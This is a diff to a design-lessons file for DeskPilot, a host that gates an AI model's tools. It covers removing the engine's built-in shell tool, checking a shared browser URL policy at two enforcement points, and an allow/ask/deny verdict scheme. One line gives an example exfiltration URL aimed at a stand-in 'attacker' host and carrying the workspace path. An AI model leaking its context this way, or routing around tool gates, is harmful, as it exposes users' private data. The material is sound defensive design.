@@ -1001,23 +1001,48 @@ source: repository evidence
 - **Own the Tool, own the gate.** When the Engine will not let the host intercept
   a built-in Tool, the answer is not always an upstream contract: check whether
   the built-in can be *removed*. `Invoke-Shp -DisableTerminal` drops
-  `run_command` from both the tool set offered to the Model and the dispatch
-  switch (verified in 0.4.0), so a DeskPilot-registered replacement becomes a
-  boundary the Model cannot route around rather than one it can decline. The
-  blocking half already exists and ships: `ask_questions` parks inside the Engine
-  Runspace on `$bridge.RequestAnswer()` and resumes when the browser answers
-  through the pending-request pump.
-- **A delegation mechanism that cannot carry your Tools cannot carry your
-  boundaries.** ShellPilot's `Invoke-ShpBatch` is a real bounded fan-out with
-  merged Usage, yet it replays registered Tools *by command name* into a runspace
-  that inherited nothing, and its own code says a Tool "backed by a function that
-  exists only in the caller's session" is skipped with a warning. Every DeskPilot
-  Tool is injected with `AddScript`, so every one would be dropped — leaving the
-  built-in `run_command` in place and the gated `run_terminal_command` gone. It
-  also forces `DisableUserPrompts`, which makes the approval bridge unreachable
-  rather than merely absent. Before adopting any execution mechanism, ask what it
-  does with the Tools your gates live in; a mechanism that silently keeps the
-  built-ins and drops your replacements re-opens the boundary you just closed.
+  `run_command` from the tool set offered to the Model — and, **from ShellPilot
+  0.4.1 onward, from dispatch as well**. The 0.4.0 claim that it gated dispatch
+  too was wrong and is recorded under anti-patterns; DeskPilot therefore names
+  its Tool `run_terminal_command` and probes the Engine for the dispatch refusal
+  at registration, failing loudly without it. With the built-in neither offered
+  nor dispatchable, a DeskPilot-registered replacement is a boundary the Model
+  cannot route around rather than one it can decline. The blocking half already
+  exists and ships: `ask_questions` parks inside the Engine Runspace on
+  `$bridge.RequestAnswer()` and resumes when the browser answers through the
+  pending-request pump.
+
+- **One boundary, two enforcement points, one corpus.** Some boundaries genuinely
+  have to be enforced twice. The browser URL policy is decided in PowerShell
+  *before* a navigation, because that is the only place an approval card can be
+  raised before anything is contacted; and again inside the Node supervisor's
+  request interceptor, because that is the only place a redirect chain, a nested
+  frame, a pop-up or a sub-resource is visible. Neither is redundant and neither
+  can be dropped. What makes the pair safe is that both are held to a single
+  shared corpus (`tests/Unit/fixtures/browser-policy-corpus.json`) asserting
+  identical verdicts, plus a one-way invariant: the second implementation may
+  never be *more permissive* than the first. Two enforcement points without a
+  shared corpus is not defence in depth, it is a drift bug with a delay on it.
+
+- **The private data is usually upstream of the tool.** The obvious reading of a
+  browser tool is that it is safe because the browser holds nothing worth
+  stealing — throwaway profile, no sign-ins, no file access. That reading misses
+  where the secrets actually are: the **Model's** context holds the conversation,
+  the Workspace Folder path and prior Turn content, and the Model chooses the
+  URL. So `open("https://attacker/?ctx=<workspace path>")` exfiltrates through
+  the address itself, with no file read and no command run. When assessing the
+  private-data leg of the lethal trifecta, ask what the *caller* knows, not only
+  what the tool can reach. The corollary is the rule that makes the resource
+  policy coherent: an off-origin image is safe and an off-origin navigation is
+  not, because the page does not know the Model's context and the Model does.
+
+- **A refusal that cannot be approved needs no card.** Splitting a policy verdict
+  three ways — allow, ask, deny — rather than two is what keeps an approval
+  prompt meaningful. `file:`, `javascript:`, embedded credentials, IP literals
+  and loopback are refused outright and never offered as a choice, because a card
+  the user could say yes to would be a hole with a confirmation step in front of
+  it. The deny checks also run *before* the scope match, so a durable allow-list
+  entry cannot re-open one.
 
 ## Anti-patterns to avoid
 
